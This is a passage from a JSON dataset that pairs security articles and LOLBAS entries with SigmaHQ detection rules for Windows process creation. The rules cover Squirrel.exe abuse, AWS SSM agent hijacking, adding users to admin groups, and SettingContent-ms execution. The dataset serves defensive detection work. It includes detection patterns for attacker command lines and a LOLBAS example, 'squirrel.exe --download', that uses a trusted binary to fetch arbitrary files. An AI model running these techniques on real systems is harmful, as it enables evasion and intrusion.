      "description": "Detects the usage of the \"Squirrel.exe\" to download arbitrary files. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
        "http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/",
        "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2022-06-09",
      "modified": "2023-11-09",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\squirrel.exe",
            "\\update.exe"
          ]
        },
        "selection_download_cli": {
          "CommandLine|contains": [
            " --download ",
            " --update ",
            " --updateRollback="
          ]
        },
        "selection_download_http_keyword": {
          "CommandLine|contains": "http"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Expected FP with some Electron based applications such as (1Clipboard, Beaker Browser, Caret, Discord, GitHub Desktop, etc.)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_squirrel_download.yml"
  },
  "503": {
    "url": "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/",
    "markdown": "# Squirrel as a Lolbin Posted on 2018-08-16 by adam Squirrel is an installation and update framework for Windows desktop apps. It is used by many applications (e.g. slack) and as a result can be found on many systems. Like other installers I described previously, Squirrel includes a bunch of components / routines that can be used to simplify typical installation tasks. This makes it a good candidate for a lolbin. The simplest way to use Squirrel component as a lolbin is to copy a test file to the application directory of the installed application, and then run `update.exe` with",
    "sigma_rule": {
      "title": "Arbitrary File Download Via Squirrel.EXE",
      "id": "1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c",
      "related": [
        {
          "id": "45239e6a-b035-4aaf-b339-8ad379fcb67e",
          "type": "similar"
        },
        {
          "id": "fa4b21c9-0057-4493-b289-2556416ae4d7",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the usage of the \"Squirrel.exe\" to download arbitrary files. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
        "http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/",
        "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2022-06-09",
      "modified": "2023-11-09",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\squirrel.exe",
            "\\update.exe"
          ]
        },
        "selection_download_cli": {
          "CommandLine|contains": [
            " --download ",
            " --update ",
            " --updateRollback="
          ]
        },
        "selection_download_http_keyword": {
          "CommandLine|contains": "http"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Expected FP with some Electron based applications such as (1Clipboard, Beaker Browser, Caret, Discord, GitHub Desktop, etc.)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_squirrel_download.yml"
  },
  "504": {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
    "markdown": "# /Squirrel.exe Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation. ### Paths: - `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Squirrel.exe` ### Resources: - https://www.youtube.com/watch?v=rOP3hnkj7ls - https://twitter.com/reegun21/status/1144182772623269889 - http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/ - https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12 - https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56 ### Detections: - Sigma: proc_creation_win_lolbin_squirrel.yml ## Download The above binary will go to url and look for RELEASES file and download the nuget package. ``` squirrel.exe --download [url to package] ``` **Use case:** Download binary **Privileges required:** User **Operating systems:** Windows 7 and up with Microsoft Teams installed **ATT&CK® technique:** T1218: System Binary Proxy Execution ## AWL bypass The above binary will go to url and look for RELEASES",
    "sigma_rule": {
      "title": "Process Proxy Execution Via Squirrel.EXE",
      "id": "45239e6a-b035-4aaf-b339-8ad379fcb67e",
      "related": [
        {
          "id": "1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c",
          "type": "similar"
        },
        {
          "id": "fa4b21c9-0057-4493-b289-2556416ae4d7",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the usage of the \"Squirrel.exe\" binary to execute arbitrary processes. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
        "http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/",
        "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2022-06-09",
      "modified": "2023-11-09",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\squirrel.exe",
            "\\update.exe"
          ]
        },
        "selection_exec": {
          "CommandLine|contains": [
            "--processStart",
            "--processStartAndWait",
            "--createShortcut"
          ]
        },
        "filter_optional_discord": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Discord\\Update.exe",
            " --processStart",
            "Discord.exe"
          ]
        },
        "filter_optional_github_desktop": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\GitHubDesktop\\Update.exe",
            "GitHubDesktop.exe"
          ],
          "CommandLine|contains": [
            "--createShortcut",
            "--processStartAndWait"
          ]
        },
        "filter_optional_teams": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
            "Teams.exe"
          ],
          "CommandLine|contains": [
            "--processStart",
            "--createShortcut"
          ]
        },
        "filter_optional_yammer": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\yammerdesktop\\Update.exe",
            "Yammer.exe"
          ],
          "CommandLine|contains": [
            "--processStart",
            "--createShortcut"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Expected FP with some Electron based applications such as (1Clipboard, Beaker Browser, Caret, Discord, GitHub Desktop, etc.)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_squirrel_proxy_execution.yml"
  },
  "505": {
    "url": "http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/",
    "markdown": "# Squirrel packages’ manager as a lolbin (a.k.a. many Electron apps are lolbins by default) Posted on 2019-03-30 by adam A week ago, or so I posted this Twit that refers to Slack’s executables as lolbins… I have already posted about it last year – the Slack’s _update.exe_ is a nice lolbin, because it’s actually a Squirrel packages’ manager in disguise. A side effect of using Electron. I was wondering if this is a common pattern, and if Slack is the only software producer that relies on this software paradigm. Right… yeah, I know, the _paradigm_ sounds very academic and",
    "sigma_rule": {
      "title": "Process Proxy Execution Via Squirrel.EXE",
      "id": "45239e6a-b035-4aaf-b339-8ad379fcb67e",
      "related": [
        {
          "id": "1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c",
          "type": "similar"
        },
        {
          "id": "fa4b21c9-0057-4493-b289-2556416ae4d7",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the usage of the \"Squirrel.exe\" binary to execute arbitrary processes. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
        "http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/",
        "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2022-06-09",
      "modified": "2023-11-09",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\squirrel.exe",
            "\\update.exe"
          ]
        },
        "selection_exec": {
          "CommandLine|contains": [
            "--processStart",
            "--processStartAndWait",
            "--createShortcut"
          ]
        },
        "filter_optional_discord": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Discord\\Update.exe",
            " --processStart",
            "Discord.exe"
          ]
        },
        "filter_optional_github_desktop": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\GitHubDesktop\\Update.exe",
            "GitHubDesktop.exe"
          ],
          "CommandLine|contains": [
            "--createShortcut",
            "--processStartAndWait"
          ]
        },
        "filter_optional_teams": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
            "Teams.exe"
          ],
          "CommandLine|contains": [
            "--processStart",
            "--createShortcut"
          ]
        },
        "filter_optional_yammer": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\yammerdesktop\\Update.exe",
            "Yammer.exe"
          ],
          "CommandLine|contains": [
            "--processStart",
            "--createShortcut"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Expected FP with some Electron based applications such as (1Clipboard, Beaker Browser, Caret, Discord, GitHub Desktop, etc.)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_squirrel_proxy_execution.yml"
  },
  "506": {
    "url": "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/",
    "markdown": "# Squirrel as a Lolbin Posted on 2018-08-16 by adam Squirrel is an installation and update framework for Windows desktop apps. It is used by many applications (e.g. slack) and as a result can be found on many systems. Like other installers I described previously, Squirrel includes a bunch of components / routines that can be used to simplify typical installation tasks. This makes it a good candidate for a lolbin. The simplest way to use Squirrel component as a lolbin is to copy a test file to the application directory of the installed application, and then run `update.exe` with",
    "sigma_rule": {
      "title": "Process Proxy Execution Via Squirrel.EXE",
      "id": "45239e6a-b035-4aaf-b339-8ad379fcb67e",
      "related": [
        {
          "id": "1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c",
          "type": "similar"
        },
        {
          "id": "fa4b21c9-0057-4493-b289-2556416ae4d7",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the usage of the \"Squirrel.exe\" binary to execute arbitrary processes. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
        "http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/",
        "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2022-06-09",
      "modified": "2023-11-09",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\squirrel.exe",
            "\\update.exe"
          ]
        },
        "selection_exec": {
          "CommandLine|contains": [
            "--processStart",
            "--processStartAndWait",
            "--createShortcut"
          ]
        },
        "filter_optional_discord": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Discord\\Update.exe",
            " --processStart",
            "Discord.exe"
          ]
        },
        "filter_optional_github_desktop": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\GitHubDesktop\\Update.exe",
            "GitHubDesktop.exe"
          ],
          "CommandLine|contains": [
            "--createShortcut",
            "--processStartAndWait"
          ]
        },
        "filter_optional_teams": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
            "Teams.exe"
          ],
          "CommandLine|contains": [
            "--processStart",
            "--createShortcut"
          ]
        },
        "filter_optional_yammer": {
          "CommandLine|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\yammerdesktop\\Update.exe",
            "Yammer.exe"
          ],
          "CommandLine|contains": [
            "--processStart",
            "--createShortcut"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Expected FP with some Electron based applications such as (1Clipboard, Beaker Browser, Caret, Discord, GitHub Desktop, etc.)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_squirrel_proxy_execution.yml"
  },
  "507": {
    "url": "https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan",
    "markdown": "# Mitiga Security Advisory: Abusing the SSM Agent as a Remote Access Trojan **LAST UPDATED:** May 4, 2024 ## Overview Mitiga has discovered a new potential post-exploitation technique in AWS (Amazon Web Services): running AWS’s Systems Manager (SSM) agent as a Remote Access Trojan (RAT) on both Linux and Windows machines, controlling the endpoint using another AWS account. We’re sharing this advisory to raise awareness about this new way of abusing the SSM agent that our team developed during our ongoing research in cloud and SaaS (Software as a Service) attacks and forensics. The concept is straightforward: the SSM agent,",
    "sigma_rule": {
      "title": "Potential Amazon SSM Agent Hijacking",
      "id": "d20ee2f4-822c-4827-9e15-41500b1fff10",
      "status": "test",
      "description": "Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.",
      "references": [
        "https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan",
        "https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/",
        "https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/"
      ],
      "author": "Muhammad Faisal",
      "date": "2023-08-02",
      "tags": [
        "attack.command-and-control",
        "attack.persistence",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\amazon-ssm-agent.exe",
          "CommandLine|contains|all": [
            "-register ",
            "-code ",
            "-id ",
            "-region "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate activity of system administrators"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ssm_agent_abuse.yml"
  },
  "508": {
    "url": "https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/",
    "markdown": "# Amazon's AWS SSM agent can be used as post-exploitation RAT malware August 2, 2023 Researchers have discovered a new post-exploitation technique in Amazon Web Services (AWS) that allows hackers to use the platform's System Manager (SSM) agent as an undetectable Remote Access Trojan (RAT). The attack concept, devised by security researchers at Mitiga, impacts both Windows and Linux machines and is preferable to using common malware and backdoors as its abuse will less likely be detected by security software. > \"We strongly believe that threat actors will abuse this in real-world attacks if they do not do so already,\"",
    "sigma_rule": {
      "title": "Potential Amazon SSM Agent Hijacking",
      "id": "d20ee2f4-822c-4827-9e15-41500b1fff10",
      "status": "test",
      "description": "Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.",
      "references": [
        "https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan",
        "https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/",
        "https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/"
      ],
      "author": "Muhammad Faisal",
      "date": "2023-08-02",
      "tags": [
        "attack.command-and-control",
        "attack.persistence",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\amazon-ssm-agent.exe",
          "CommandLine|contains|all": [
            "-register ",
            "-code ",
            "-id ",
            "-region "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate activity of system administrators"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ssm_agent_abuse.yml"
  },
  "509": {
    "url": "https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/",
    "markdown": "# Attackers can turn AWS SSM agents into remote access trojans Mitiga researchers have documented a new post-exploitation technique attackers can use to gain persistent remote access to AWS Elastic Compute Cloud (EC2) instances (virtual servers), as well as to non-EC2 machines (e.g., on-premises enterprise servers and virtual machines, and VMs in other cloud environments). The success of this “living off the land” technique hinges on: - Attackers gaining initial access to the machine (e.g., by exploiting an unpatched vulnerability on a public-facing instance/server), and - The presence of the SSM Agent, a software component that enterprise sysadmins use to",
    "sigma_rule": {
      "title": "Potential Amazon SSM Agent Hijacking",
      "id": "d20ee2f4-822c-4827-9e15-41500b1fff10",
      "status": "test",
      "description": "Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.",
      "references": [
        "https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan",
        "https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/",
        "https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/"
      ],
      "author": "Muhammad Faisal",
      "date": "2023-08-02",
      "tags": [
        "attack.command-and-control",
        "attack.persistence",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\amazon-ssm-agent.exe",
          "CommandLine|contains|all": [
            "-register ",
            "-code ",
            "-id ",
            "-region "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate activity of system administrators"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ssm_agent_abuse.yml"
  },
  "510": {
    "url": "https://blog.talosintelligence.com/recent-cyber-attack",
    "markdown": "# Cisco Talos shares insights related to recent cyber attack on Cisco _By Nick Biasini_ **Wednesday, August 10, 2022 15:30** **Category:** Headlines --- ### THIS POST IS ALSO AVAILABLE IN: 日本語 (Japanese) --- ## Update History | Date | Description of Updates | |------------------|----------------------------------------------------------------------------------------| | Aug. 10th 2022 | Adding clarifying details on activity involving active directory. | | Aug. 10th 2022 | Update made to the Cisco Response and Recommendations section related to MFA. | --- ## Executive summary - On May 24, 2022, Cisco became aware of a potential compromise. Since that point, Cisco Security Incident Response (CSIRT)",
    "sigma_rule": {
      "title": "User Added to Local Administrators Group",
      "id": "ad720b90-25ad-43ff-9b5e-5c841facc8e5",
      "related": [
        {
          "id": "ffa28e60-bdb1-46e0-9f82-05f7a61cc06e",
          "type": "similar"
        },
        {
          "id": "10fb649c-3600-4d37-b1e6-56ea90bb7e09",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects addition of users to the local administrator group via \"Net\" or \"Add-LocalGroupMember\".",
      "references": [
        "https://blog.talosintelligence.com/recent-cyber-attack"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2023-03-02",
      "tags": [
        "attack.persistence",
        "attack.t1098"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_main": [
          {
            "CommandLine|contains|all": [
              "localgroup ",
              " /add"
            ]
          },
          {
            "CommandLine|contains|all": [
              "Add-LocalGroupMember ",
              " -Group "
            ]
          }
        ],
        "selection_group": {
          "CommandLine|contains": [
            " administrators ",
            " administrateur"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_add_user_local_admin_group.yml"
  },
  "511": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/",
    "markdown": "# Evolving trends in Iranian threat actor activity – MSTIC presentation at CyberWarCon 2021 **Research** | **Threat intelligence** | **Threat actors** **November 16, 2021** --- ### April 2023 update Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. Nation-state actors from Iran are now tracked under the name Sandstorm. - **CURIUM** is now tracked as **Crimson Sandstorm** - **EUROPIUM** is now tracked as **Hazel Sandstorm** - **PHOSPHORUS** is now tracked as **Mint Sandstorm** - **DEV-0343** is now tracked as **Gray Sandstorm** To learn more about this evolution, how the new taxonomy",
    "sigma_rule": {
      "title": "User Added to Remote Desktop Users Group",
      "id": "ffa28e60-bdb1-46e0-9f82-05f7a61cc06e",
      "related": [
        {
          "id": "ad720b90-25ad-43ff-9b5e-5c841facc8e5",
          "type": "similar"
        },
        {
          "id": "10fb649c-3600-4d37-b1e6-56ea90bb7e09",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects addition of users to the local Remote Desktop Users group via \"Net\" or \"Add-LocalGroupMember\".",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-12-06",
      "modified": "2022-09-09",
      "tags": [
        "attack.persistence",
        "attack.lateral-movement",
        "attack.t1133",
        "attack.t1136.001",
        "attack.t1021.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_main": [
          {
            "CommandLine|contains|all": [
              "localgroup ",
              " /add"
            ]
          },
          {
            "CommandLine|contains|all": [
              "Add-LocalGroupMember ",
              " -Group "
            ]
          }
        ],
        "selection_group": {
          "CommandLine|contains": [
            "Remote Desktop Users",
            "Utilisateurs du Bureau à distance",
            "Usuarios de escritorio remoto"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_add_user_remote_desktop_group.yml"
  },
  "512": {
    "url": "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
    "markdown": "# BazarLoader ‘call me back’ attack abuses Windows 10 Apps mechanism The unusual technique invokes the Windows App Installer to deliver malware **Posted on** November 11, 2021 ### Categories - SophosLabs Uncut - Threat Research - App Installer - BazarBackdoor - BazarLoader - Windows 10 Apps - Windows Store --- *Update (2021-01-15): Microsoft Security Response has issued CVE-2021-43890 in reference to the vulnerability in the App installer process described below. The bug was fixed in the January, 2022 Patch Tuesday release. We thank Microsoft for taking rapid action to address this vulnerability.* The emails that flooded into inboxes last week",
    "sigma_rule": {
      "title": "Potentially Suspicious Windows App Activity",
      "id": "f91ed517-a6ba-471d-9910-b3b4a398c0f3",
      "status": "test",
      "description": "Detects potentially suspicious child process of applications launched from inside the WindowsApps directory. This could be a sign of a rogue \".appx\" package installation/execution",
      "references": [
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-12",
      "modified": "2023-08-31",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|contains": "C:\\Program Files\\WindowsApps\\"
        },
        "selection_susp_img": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ]
        },
        "selection_susp_cli": {
          "CommandLine|contains": [
            "cmd /c",
            "Invoke-",
            "Base64"
          ]
        },
        "filter_optional_terminal": {
          "ParentImage|contains": ":\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal",
          "ParentImage|endswith": "\\WindowsTerminal.exe",
          "Image|endswith": [
            "\\powershell.exe",
            "\\cmd.exe",
            "\\pwsh.exe"
          ]
        },
        "condition": "selection_parent and 1 of selection_susp_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate packages that make use of external binaries such as Windows Terminal"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_appx_execution.yml"
  },
  "513": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment **Date:** July 14, 2022 This article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps. - **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package. - **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps. - **January, 2022:** Malicious Windows Apps in *APPX* format",
    "sigma_rule": {
      "title": "Potentially Suspicious Windows App Activity",
      "id": "f91ed517-a6ba-471d-9910-b3b4a398c0f3",
      "status": "test",
      "description": "Detects potentially suspicious child process of applications launched from inside the WindowsApps directory. This could be a sign of a rogue \".appx\" package installation/execution",
      "references": [
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-12",
      "modified": "2023-08-31",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|contains": "C:\\Program Files\\WindowsApps\\"
        },
        "selection_susp_img": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ]
        },
        "selection_susp_cli": {
          "CommandLine|contains": [
            "cmd /c",
            "Invoke-",
            "Base64"
          ]
        },
        "filter_optional_terminal": {
          "ParentImage|contains": ":\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal",
          "ParentImage|endswith": "\\WindowsTerminal.exe",
          "Image|endswith": [
            "\\powershell.exe",
            "\\cmd.exe",
            "\\pwsh.exe"
          ]
        },
        "condition": "selection_parent and 1 of selection_susp_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate packages that make use of external binaries such as Windows Terminal"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_appx_execution.yml"
  },
  "514": {
    "url": "https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39",
    "markdown": "# The Tale of SettingContent-ms Files As an attacker, initial access can prove to be quite the challenge against a hardened target. When selecting a payload for initial access, an attacker has to select a file format that allows arbitrary code execution or shell command execution with minimal user interaction. These file formats can be sparse, which is why attackers have relied on file types like .HTAs, Office macros, .VBS, .JS, etc. There are obviously a finite number of built-in file extensions on Windows, and as defenses improve, the number of effective payloads continues to shrink. Additionally, an attacker has",
    "sigma_rule": {
      "title": "Arbitrary Shell Command Execution Via Settingcontent-Ms",
      "id": "24de4f3b-804c-4165-b442-5a06a2302c7e",
      "status": "test",
      "description": "The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create \"shortcuts\" to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries.",
      "references": [
        "https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39"
      ],
      "author": "Sreeman",
      "date": "2020-03-13",
      "modified": "2022-04-14",
      "tags": [
        "attack.t1204",
        "attack.t1566.001",
        "attack.execution",
        "attack.initial-access"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": ".SettingContent-ms"
        },
        "filter": {
          "CommandLine|contains": "immersivecontrolpanel"
        },
        "condition": "selection and not filter"
      },
      "fields": [
        "ParentProcess",
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_arbitrary_shell_execution_via_settingcontent.yml"
